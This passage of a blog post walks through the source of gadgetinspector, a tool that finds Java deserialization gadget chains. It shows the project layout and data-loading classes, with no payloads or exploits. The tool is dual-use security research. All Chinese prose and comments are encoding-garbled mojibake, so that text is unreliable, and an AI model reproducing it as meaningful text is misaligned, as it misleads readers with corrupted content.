the referenced subroutines</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>methodVisitor   å°†ç”Ÿæˆçš„å†…è”æ–¹æ³•ä»£ç å‘é€åˆ°çš„æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access    æ–¹æ³•çš„è®¿é—®æ ‡å¿—ï¼ˆOpcodesï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    æ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor      æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature    æ–¹æ³•çš„ç­¾å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptions      æ–¹æ³•å¼‚å¸¸ç±»çš„å†…éƒ¨åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> JSRInlinerAdapterâ€‹(MethodVisitor methodVisitor,</span><br><span class="line">                         <span class="keyword">int</span> access,</span><br><span class="line">                         java.lang.String name,</span><br><span class="line">                         java.lang.String descriptor,</span><br><span class="line">                         java.lang.String signature,</span><br><span class="line">                         java.lang.String[] exceptions)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x02-é¡¹ç›®ç»“æ„"><a href="#0x02-é¡¹ç›®ç»“æ„" class="headerlink" title="0x02 é¡¹ç›®ç»“æ„"></a>0x02 é¡¹ç›®ç»“æ„</h1><p>é¡¹ç›®ä¸­åŒ…å«ä¸‰ç§æ£€æµ‹å®ç°ï¼Œåœ¨ä»¥ä¸‹ä¸‰ä¸ªç›®å½•ä¸‹ï¼šjavaserial é’ˆå¯¹ Java åŸç”Ÿåºåˆ—åŒ–ï¼Œjackson é’ˆå¯¹ Jacksonï¼ˆJSON åº“ï¼‰ï¼Œxstream é’ˆå¯¹ XStreamï¼ˆXML åº“ï¼‰ï¼ŒåŒæ—¶åœ¨ config ç›®å½•ä¸‹å®ç°äº†å„è‡ªçš„é…ç½®æ¥å£ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ config      <span class="comment"># é…ç½®æ¥å£å’Œå…·ä½“å®ç°</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ConfigRepository.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ GIConfig.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonDeserializationConfig.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JavaDeserializationConfig.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ XstreamDeserializationConfig.java</span><br><span class="line">â”œâ”€â”€ data        <span class="comment"># æ•°æ®çš„å­˜å‚¨æ ¼å¼ä»¥åŠè¯»å–æ–¹æ³•</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ClassReference.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ DataFactory.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ DataLoader.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ GraphCall.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InheritanceDeriver.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ InheritanceMap.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ MethodReference.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ Source.java</span><br><span class="line">â”œâ”€â”€ jackson     <span class="comment"># JSON åº“</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonImplementationFinder.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ JacksonSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ JacksonSourceDiscovery.java</span><br><span class="line">â”œâ”€â”€ javaserial  <span class="comment"># åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SimpleImplementationFinder.java</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SimpleSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ SimpleSourceDiscovery.java</span><br><span class="line">â”œâ”€â”€ xstream     <span class="comment"># XML åº“</span></span><br><span class="line">â”‚Â Â  â”œâ”€â”€ CustomXstreamSerializableDecider.java</span><br><span class="line">â”‚Â Â  â””â”€â”€ XstreamSerializableDecider.java</span><br><span class="line">â”œâ”€â”€ CallGraphDiscovery.java             <span class="comment"># æ–¹æ³•è°ƒç”¨é“¾ä¸­çš„æ±¡ç‚¹å‚æ•°ä¼ é€’å…³ç³»</span></span><br><span class="line">â”œâ”€â”€ ClassResourceEnumerator.java        <span class="comment"># ç±»æšä¸¾å™¨</span></span><br><span class="line">â”œâ”€â”€ GadgetChainDiscovery.java           <span class="comment"># æœç´¢åˆ©ç”¨é“¾</span></span><br><span class="line">â”œâ”€â”€ GadgetInspector.java                <span class="comment"># ä¸»ç±»ï¼Œç¨‹åºå…¥å£</span></span><br><span class="line">â”œâ”€â”€ ImplementationFinder.java           <span class="comment"># æ¥å£ï¼Œè·å–ç›®æ ‡æ–¹æ³•çš„å­ç±»å®ç°</span></span><br><span class="line">â”œâ”€â”€ MethodDiscovery.java                <span class="comment"># ç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ PassthroughDiscovery.java           <span class="comment"># æ–¹æ³•çš„è¿”å›å€¼ä¸å‚æ•°çš„å…³ç³»</span></span><br><span class="line">â”œâ”€â”€ SerializableDecider.java            <span class="comment"># åºåˆ—åŒ–å†³ç­–è€…æ¥å£</span></span><br><span class="line">â”œâ”€â”€ SourceDiscovery.java                <span class="comment"># æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ TaintTrackingMethodVisitor.java     <span class="comment"># æ–¹æ³•è®¿é—®è€…</span></span><br><span class="line">â””â”€â”€ Util.java                           <span class="comment"># å·¥å…·å‡½æ•°</span></span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-data"><a href="#gadgetinspector-data" class="headerlink" title="gadgetinspector/data"></a>gadgetinspector/data</h2><p>ä¸»è¦æ˜¯æ•°æ®æ ¼å¼çš„å®šä¹‰ã€‚</p><h3 id="1-DataLoader"><a href="#1-DataLoader" class="headerlink" title="1. DataLoader"></a>1. DataLoader</h3><p>å®šä¹‰äº†æ•°æ®çš„è¯»å†™æ–¹å¼ï¼Œæ ¹æ®æ•°æ®å·¥å‚æ–¹æ³•ï¼ˆDataFactoryï¼‰è¿›è¡Œè¯»å†™ï¼Œ<code>loadData</code> è¿”å›çš„æ˜¯åŠ¨æ€æ•°ç»„ï¼Œæºç ä¸­å¤šå¤„è°ƒç”¨è¿›è¡Œæ•°æ®éå†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ•°æ®å·¥å‚æ¥å£è§£ææ•°æ®åˆ°å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  å·¥å‚æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">loadData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; lines = Files.readLines(filePath.toFile(), StandardCharsets.UTF_8);</span><br><span class="line">    <span class="keyword">final</span> List&lt;T&gt; values = <span class="keyword">new</span> ArrayList&lt;T&gt;(lines.size());</span><br><span class="line">    <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">        values.add(factory.parse(line.split(<span class="string">&quot;\t&quot;</span>, -<span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ•°æ®å·¥å‚æ¥å£å°†æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  å·¥å‚æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> values   å¾…å†™å…¥çš„æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      ç±»å‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">saveData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory, Collection&lt;T&gt; values)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> (BufferedWriter writer = Files.newWriter(filePath.toFile(), StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (T value : values) &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] fields = factory.serialize(value);</span><br><span class="line">            <span class="keyword">if</span> (fields == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (String field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>).append(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writer.write(sb.substring(<span class="number">1</span>));</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å®ç°è¯»å–ç±»ä¿¡æ¯ï¼ˆclasses.datï¼‰å’Œæ–¹æ³•ä¿¡æ¯ï¼ˆmethods.datï¼‰ï¼Œè¿”å›å­˜å‚¨é”®å€¼çš„ Mapï¼Œæºç ä¸­å¤šæ¬¡è°ƒç”¨ç”¨äºæœç´¢ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» classes.dat åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;ClassReference.Handle, ClassReference&gt; loadClasses() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : loadData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> ClassReference.Factory())) &#123;</span><br><span class="line">            classMap.put(classReference.getHandle(), classReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» methods.dat åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, MethodReference&gt; loadMethods() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference methodReference : loadData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> MethodReference.Factory())) &#123;</span><br><span class="line">            methodMap.put(methodReference.getHandle(), methodReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> methodMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DataFactory"><a href="#2-DataFactory" class="headerlink" title="2. DataFactory"></a>2. DataFactory</h3><p>æ•°æ®å·¥å‚æ¥å£ï¼Œå®šä¹‰æ•°æ®çš„å­˜å‚¨æ ¼å¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DataFactory</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">parse</span><span class="params">(String[] fields)</span></span>;</span><br><span class="line">    String[] serialize(T obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ClassReference"><a href="#3-ClassReference" class="headerlink" title="3. ClassReference"></a>3. ClassReference</h3><p>å®šä¹‰<strong>ç±»ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼Œè¿™äº›ä¿¡æ¯å…·ä½“éƒ½ä½¿ç”¨ asm è®¿é—®è€…è®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassReference</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;          <span class="comment">// ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String superClass;    <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] interfaces;  <span class="comment">// æ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isInterface;  <span class="comment">// æ˜¯å¦ä¸ºæ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Member[] members;     <span class="comment">// å­—æ®µ/å±æ€§/æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Member</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">// åç§°</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> modifiers;                <span class="comment">// è®¿é—®ä¿®é¥°ç¬¦</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle type;   <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Member</span><span class="params">(String name, <span class="keyword">int</span> modifiers, Handle type)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.modifiers = modifiers;</span><br><span class="line">            <span class="keyword">this</span>.type = type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getModifiers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> modifiers;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Handle <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassReference</span><span class="params">(String name, String superClass, String[] interfaces, <span class="keyword">boolean</span> isInterface, Member[] members)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.superClass = superClass;</span><br><span class="line">        <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">        <span class="keyword">this</span>.isInterface = isInterface;</span><br><span class="line">        <span class="keyword">this</span>.members = members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSuperClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> superClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getInterfaces() &#123;</span><br><span class="line">        <span class="keyword">return</span> interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterface</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isInterface;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Member[] getMembers() &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Handle <span class="title">getHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Handle(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;  <span class="comment">// ç±»å</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Handle</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            Handle handle = (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.equals(handle.name) : handle.name == <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>ç±»ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å çˆ¶ç±»å æ¥å£A,æ¥å£B,æ¥å£C æ˜¯å¦ä¸ºæ¥å£ å­—æ®µ1!å­—æ®µ1è®¿é—®æ ‡å¿—!å­—æ®µ1ç±»å‹!å­—æ®µ2!å­—æ®µ2è®¿é—®æ ‡å¿—!å­—æ®µ2ç±»å‹</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">ClassReference</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ClassReference <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        String[] interfaces;</span><br><span class="line">        <span class="keyword">if</span> (fields[<span class="number">2</span>].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            interfaces = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = fields[<span class="number">2</span>].split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] memberEntries = fields[<span class="number">4</span>].split(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        Member[] members = <span class="keyword">new</span> Member[memberEntries.length / <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; members.length; i++) &#123;</span><br><span class="line">            members[i] = <span class="keyword">new</span> Member(memberEntries[<span class="number">3</span> * i], Integer.parseInt(memberEntries[<span class="number">3</span> * i + <span class="number">1</span>]),</span><br><span class="line">                    <span class="keyword">new</span> ClassReference.Handle(memberEntries[<span class="number">3</span> * i + <span class="number">2</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ClassReference(</span><br><span class="line">                fields[<span class="number">0</span>],</span><br><span class="line">                fields[<span class="number">1</span>].equals(<span class="string">&quot;&quot;</span>) ? <span class="keyword">null</span> : fields[<span 